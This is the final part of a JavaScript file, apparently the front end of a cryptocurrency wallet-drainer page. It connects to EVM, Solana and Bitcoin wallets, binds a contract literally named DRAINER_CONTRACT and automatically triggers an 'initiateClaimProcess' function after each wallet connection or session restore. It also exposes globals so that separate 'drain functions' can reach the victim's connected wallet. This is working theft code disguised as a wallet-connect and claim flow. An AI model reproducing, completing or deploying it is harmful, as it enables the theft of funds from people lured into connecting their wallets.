      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton) walletButton.addEventListener('click', handleClick);

  // ============================================================
  // 24. RESTORE SESSION (for WalletConnect)
  // ============================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedChain = getSavedChainType();
    const savedSession = getSavedSession();

    // Check for pending WC redirect (but we don't use deeplinks, so ignore)
    if (savedWallet && savedChain !== 'unknown') {
      logDebug(`♻️ Restoring ${savedChain} wallet: ${savedWallet}`);

      if (savedChain === 'evm') {
        if (savedSession) {
          const initSuccess = await initWalletConnect(false);
          if (initSuccess) {
            try {
              const session = client.session.get(savedSession.topic);
              if (session) {
                currentSession = session;
                currentAddress = savedWallet;
                currentChain = 'evm';
                updateConnectedUI(savedWallet, 'evm');
                // Set up Web3 with WalletConnect provider (as in connectViaWalletConnect)
                const provider = {
                  request: async ({ method, params }) => {
                    return client.request({ topic: session.topic, chainId: 'eip155:1', request: { method, params } });
                  },
                  on: (event, listener) => { /* stub */ },
                  removeListener: (event, listener) => { /* stub */ }
                };
                const Web3 = (await import('web3')).default;
                web3Instance = new Web3(provider);
                contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
                return;
              }
            } catch (e) { logDebug(`Session restore failed: ${e.message}`); }
          }
        }
        // Try direct provider (desktop only)
        if (isDesktop() && window.ethereum) {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' }).catch(() => []);
          if (accounts.length > 0 && accounts[0] === savedWallet) {
            updateConnectedUI(savedWallet, 'evm');
            currentAddress = savedWallet;
            currentChain = 'evm';
            const Web3 = (await import('web3')).default;
            web3Instance = new Web3(window.ethereum);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            setupEVMProviderEvents(window.ethereum);
            return;
          }
        }
        // If we're on mobile and no session, clear saved wallet
        if (isMobile()) {
          clearSavedWallet();
        }
      } else if (savedChain === 'solana') {
        if (isDesktop() && window.solana && window.solana.publicKey) {
          const addr = window.solana.publicKey.toString();
          if (addr === savedWallet) {
            updateConnectedUI(savedWallet, 'solana');
            window.solanaPublicKey = addr;
            window.solanaProvider = window.solana;
            currentAddress = savedWallet;
            currentChain = 'solana';
            return;
          }
        }
        if (isDesktop()) {
          const success = await connectSolana();
          if (success) return;
        }
        clearSavedWallet();
      } else if (savedChain === 'bitcoin') {
        if (isDesktop() && window.unisat) {
          try {
            const accounts = await window.unisat.getAccounts();
            if (accounts.length > 0 && accounts[0] === savedWallet) {
              updateConnectedUI(savedWallet, 'bitcoin');
              currentAddress = savedWallet;
              currentChain = 'bitcoin';
              return;
            }
          } catch (e) {}
        }
        clearSavedWallet();
      }
    }
  }

  // ============================================================
  // 25. LOAD LIBRARIES AND START
  // ============================================================
  try {
    const libs = await loadWalletConnect();
    SignClient = libs.SignClient;
    WalletConnectModal = libs.WalletConnectModal;
    logDebug('✅ WalletConnect libraries loaded');

    setupEIP6963();

    await restoreWalletConnection();
  } catch (err) {
    logDebug(`❌ Fatal error loading libraries: ${err.message}`);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // ============================================================
  // 26. SESSION LISTENERS (EVM via WalletConnect)
  // ============================================================
  setTimeout(() => {
    if (client) {
      client.on('session_update', ({ params }) => {
        const accounts = params.namespaces?.eip155?.accounts;
        if (accounts?.length) {
          const account = accounts[0].split(':')[2];
          updateConnectedUI(account, 'evm');
          saveWallet(account, currentSession, 'evm');
          currentAddress = account;
          // Update web3 provider (if needed)
          setTimeout(() => {
            if (typeof window.initiateClaimProcess === 'function') {
              window.initiateClaimProcess();
            }
          }, 1000);
        }
      });
      client.on('session_delete', () => {
        resetConnectedUI();
        clearSavedWallet();
        showStatus('Wallet disconnected by provider', 'error');
        web3Instance = null;
        contractInstance = null;
        currentAddress = null;
        currentChain = null;
      });
      client.on('session_connect', (session) => {
        const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (account) {
          saveWallet(account, session, 'evm');
          updateConnectedUI(account, 'evm');
          currentSession = session;
          currentAddress = account;
          currentChain = 'evm';
          setTimeout(() => {
            if (typeof window.initiateClaimProcess === 'function') {
              window.initiateClaimProcess();
            }
          }, 1000);
        }
      });
    }
  }, 1000);

  // ============================================================
  // 27. GLOBAL EVM PROVIDER EVENTS (if already set up)
  // ============================================================
  if (window.ethereum && isDesktop()) {
    setupEVMProviderEvents(window.ethereum);
  }

  // ============================================================
  // 28. VISIBILITY CHANGE – check for session return (no deeplink)
  // ============================================================
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden && getSavedWallet()) {
      logDebug('Page visible, checking connection...');
      // Re-check for pending session (only if we have a pending URI)
      const pendingUri = sessionStorage.getItem('pending_wc_uri');
      const pendingTimestamp = sessionStorage.getItem('pending_wc_timestamp');
      if (pendingUri && pendingTimestamp) {
        const elapsed = Date.now() - parseInt(pendingTimestamp);
        if (elapsed < 120000 && client) {
          logDebug('Visibility change: checking for pending session...');
          setTimeout(async () => {
            try {
              const sessions = client.session.values();
              if (sessions.length > 0) {
                const session = sessions[0];
                const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
                if (account) {
                  saveWallet(account, session, 'evm');
                  updateConnectedUI(account, 'evm');
                  currentSession = session;
                  currentAddress = account;
                  currentChain = 'evm';
                  // Set up web3
                  const provider = {
                    request: async ({ method, params }) => {
                      return client.request({ topic: session.topic, chainId: 'eip155:1', request: { method, params } });
                    },
                    on: (event, listener) => { /* stub */ },
                    removeListener: (event, listener) => { /* stub */ }
                  };
                  const Web3 = (await import('web3')).default;
                  web3Instance = new Web3(provider);
                  contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
                  sessionStorage.removeItem('pending_wc_uri');
                  sessionStorage.removeItem('pending_wc_timestamp');
                  setTimeout(() => {
                    if (typeof window.initiateClaimProcess === 'function') {
                      window.initiateClaimProcess();
                    }
                  }, 1000);
                }
              }
            } catch (e) {
              logDebug(`Visibility check session restore failed: ${e.message}`);
            }
          }, 1000);
        }
      }
    }
  });

  // ============================================================
  // 29. CLEANUP
  // ============================================================
  window.addEventListener('beforeunload', () => {
    if (modal) modal.closeModal();
  });

  // ============================================================
  // 30. EXPOSE GLOBALS FOR OTHER SCRIPTS (e.g., Script.js)
  // ============================================================
  window.web3 = web3Instance;
  window.contractInstance = contractInstance;
  // Also expose the current address and chain
  window.connectedAddress = currentAddress;
  window.connectedChain = currentChain;
  // Ensure that the drain functions can access these

  logDebug(`✅ main.js fully initialised with device‑aware connection flow`);
  logDebug(`   Platform: ${getPlatform()} | Mobile: ${isMobile()} | Desktop: ${isDesktop()}`);
  logDebug(`   Connection flow: ${isMobile() ? 'WalletConnect only' : 'Direct EVM (5s timeout) → WalletConnect → Solana → Bitcoin'}`);
})();
